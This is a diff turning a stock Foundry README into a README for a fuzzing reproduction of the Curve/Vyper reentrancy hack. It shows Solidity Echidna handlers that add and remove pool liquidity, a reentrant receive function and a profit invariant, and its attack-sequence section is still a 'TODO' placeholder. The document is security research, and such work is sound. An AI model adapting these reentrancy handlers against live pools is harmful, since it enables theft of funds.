@@ -1,66 +1,88 @@
-## Foundry
+# Curve Hack - Fuzzing Reproduction
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+## Description
+This repository contains a reproduction of one of the hacks that occurred due to a reentrancy bug in Curve, caused by a compiler issue in Vyper. Assets stolen from the Curve pools due to this security flaw exceeded $41 million. For more details, refer to the [Vyper compiler saga](https://medium.com/rektify-ai/the-vyper-compiler-saga-unraveling-the-reentrancy-bug-that-shook-defi-86ade6c54265) on Rekt.
 
-Foundry consists of:
+## Methodology
+To reproduce the bug, we utilize Echidna's on-chain fuzzing. 
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
-
-## Documentation
-
-https://book.getfoundry.sh/
-
-## Usage
-
-### Build
-
-```shell
-$ forge build
+We define a single invariant to check if an attacker can increase their ETH balance.
+```solidity
+function testProfit() public {
+    uint256 balance = address(this).balance;
+    gte(initialBalance, balance, "Profit test");
+}
 ```
 
-### Test
+We then add handlers to add and remove liquidity to the Curve pool, focusing solely on ETH for simplicity. By clamping, we ensure the fuzzer only adds or removes an amount within the attacker's current balance.
+```solidity
+    function addLiquidity(uint128 _amount) public {
+        _amount = uint128(clampBetween(_amount, 0, address(this).balance));
 
-```shell
-$ forge test
+        uint256[2] memory amount;
+        amount[0] = _amount;
+        amount[1] = 0;
+
+        pool.add_liquidity{value: _amount}(amount, 0);
+    }
+
+    function removeLiquidity(uint128 _amount) public {
+        _amount = uint128(
+            clampBetween(_amount, 0, pool.balanceOf(address(this)))
+        );
+
+        uint256[2] memory amount;
+        amount[0] = 0;
+        amount[1] = 0;
+
+        pool.remove_liquidity(_amount, amount);
+    }
 ```
 
-### Format
+Given the hack involves reentrancy, we implement a rudimentary reentrancy handler in the `receive` function.
+```solidity
+    receive() external payable {
+        if (reentrancyEnabled) {
+            uint256 functionId = (reentrancyFunction % 2 == 1) ? 0 : 1;
 
-```shell
-$ forge fmt
+            if (reentrancyFunction == 0) {
+                addLiquidity(reentrancyAmount);
+            } else if (reentrancyFunction == 1) {
+                removeLiquidity(reentrancyAmount);
+            }
+        }
+    }
 ```
 
-### Gas Snapshots
+The behavior of this handler is controlled by global variables, which are set by the fuzzer.
+```solidity
+    function setReentrancyEnabled(bool _reentrancyEnabled) public {
+        reentrancyEnabled = _reentrancyEnabled;
+    }
 
-```shell
-$ forge snapshot
+    function setReentrancyFunction(uint8 _reentrancyFunction) public {
+        reentrancyFunction = _reentrancyFunction;
+    }
+
+    function setReentrancyAmount(uint128 _reentrancyAmount) public {
+        reentrancyAmount = _reentrancyAmount;
+    }
 ```
 
-### Anvil
-
-```shell
-$ anvil
+Echidna typically detects the bug within 5 minutes using a single worker. The sequence leading to the hacks can be seen below.
+```
+TODO
 ```
 
-### Deploy
+## Future Research
+The current Proof of Concept is deliberately kept simple to optimize for fuzzing. Enhancing it to resemble a more comprehensive fuzzing suite could include:
+-  Adding a handler for `exchange`
+- Support for adding liquidity to all tokens in the pool
+- Simulating multiple actors
 
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
+While these additions would increase the complexity and slow down the fuzzing process due to a larger search space, they would still effectively reproduce the hack.
 
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
-```
+## Links
+- https://medium.com/rektify-ai/the-vyper-compiler-saga-unraveling-the-reentrancy-bug-that-shook-defi-86ade6c54265
+- https://hackmd.io/@LlamaRisk/BJzSKHNjn
+-
